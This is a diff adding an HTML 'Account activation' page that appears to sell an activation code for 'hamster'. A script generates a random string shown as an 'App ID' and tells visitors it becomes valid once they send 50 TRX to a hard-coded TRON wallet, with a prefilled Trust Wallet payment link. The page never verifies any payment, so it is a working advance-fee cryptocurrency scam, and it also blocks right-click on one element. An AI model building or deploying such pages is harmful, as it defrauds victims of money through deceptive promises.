@@ -1,0 +1,152 @@
+<!DOCTYPE HTML>
+<html>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<header>
+    <title></title>
+</header>
+<body id="myDiv1">
+    <h1><center></center></h1>
+    <div>
+        <h3 style="color:lightGreen;"><center id="myDiv">Almost done <strong></strong></center></h3>
+
+        <div id="myDiv">
+
+            <center>  <label for="buy activation code" style="background-color:red;">Account activation </center><br><br />
+
+                <center> <img src="img.png" alt=" logo" width="70px" />
+                </center>
+                <center>   <label for="App ID">App ID</label>                   </center> <br />
+                <center>       <div1 class="container">
+                    <div1 class="input-data" id="mydiv">
+                        <div1 class="display">
+                            <input type="text" disabled="" required="" id="mydiv">
+                            <span class="far fa-copy" onclick="copy()"></span>
+                            <span class="fas fa-copy" onclick="copy()"></span>
+                        </div1> <br />
+                        <button>Generate App Id</button>
+                    </div1>
+                </div1>
+                    <center>    <p>
+                        pay a minimum of 50 worth of trx to purchased activation code which will be used to access hamster, your app id generated will become valid once payment is comfirmed app id will be use as activation code after payment Note: send the exact amoun.
+                        <br> </center>
+                        <label for="TRX Address">TRX Address</label>
+                        your activation code.
+                    </p>
+                    <p class="trx">
+                        TTVxNsHAucjdcFZwBrUQvmvAPEtAqTp8Jm
+                    </p>
+                    <label>Network type:</label>
+                    <select>
+                        <optgroup label="Select Network type">
+                            <optionvalue=""></option>
+                            <option value="">TRC20</option>
+                        </select>
+                        <br /> <br />
+                        <a href="https://link.trustwallet.com/send?coin=195&address=TTVxNsHAucjdcFZwBrUQvmvAPEtAqTp8Jm&amount=50.0">
+                            <button class="gbobal-secondary-btn" style="width:128px; height:40px;"><i> 50 TRX</i></button></center></a>
+                </a><br />
+                <br />
+                <center><input type="txt" name="" id="" placeholder="trx hash" /> <br><br />
+                    <a href="#https://link.trustwallet.com/send?coin=195&address=TTVxNsHAucjdcFZwBrUQvmvAPEtAqTp8Jm&amount=50.0">
+                        <button class="gbobal-secondary-btn" style="width:128px; height:40px;"><i> Activate</i></button></center></a>
+            </div>
+            <style type="text/css" media="all">
+                body {
+                    background: ash;
+                    color: white;
+                    background-image: url('/0/yask logins/img.jpg/');
+                }
+                h1 {
+                    opacity: 0.4;
+                    font-family: wedding;
+
+                }
+                div {
+                    background-color: black;
+                    color: white;
+                    border: ridge;
+                    object-position: center;
+                    height: 1031px;
+                    weight: 10px;
+                    border-radius: 37px;
+                }
+                input {
+                    color: black;
+                    font-size:;
+                    font-family: serif;
+                    background: white;
+                    height: 40px;
+
+                }
+                p.trx {
+                    color: black;
+                    font-size:;
+                    font-family: serif;
+                    background: white;
+                    height: 20px;
+                    width: 300;
+                    margin-left: 0.4cm;
+                }
+
+
+
+                h3 {
+                    color: black;
+                    font-size: 30;
+                    font-family: serif;
+                    background: red;
+
+                }
+                button {
+                    color: black;
+                    font-size:;
+                    font-family: serif;
+                    background: lightGreen;
+                    border: hidden;
+                }
+                img {
+                    border: hidden;
+                    border-radius: 50px;
+
+
+                }
+                p {
+                    color: red;
+                    font-size:;
+                    font-family: serif;
+                    background: white;
+                    width: 220px;
+                    margin-left: cm;
+                }
+            </style>
+            <script>
+                const div = document.getElementById("myDiv");
+                div.addEventListener("contextmenu", (e) => {
+                    e.preventDefault()});
+                const display = document.querySelector("input"),
+                button = document.querySelector("button"),
+                copyBtn = document.querySelector("span.far"),
+                copyActive = document.querySelector("span.fas");
+                let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#$%@!";
+                button.onclick = ()=> {
+                    let i,
+                    randomPassword = "";
+                    copyBtn.style.display = "block";
+                    copyActive.style.display = "none";
+                    for (i = 0; i < 12; i++) {
+                        randomPassword = randomPassword + chars.charAt(
+                            Math.floor(Math.random() * chars.length)
+                        );
+                    }
+                    display.value = randomPassword;
+                }
+                function copy() {
+                    copyBtn.style.display = "none";
+                    copyActive.style.display = "block";
+                    display.select();
+                    document.execCommand("copy");
+                }
+            </script>
+        </body>
+    </html>
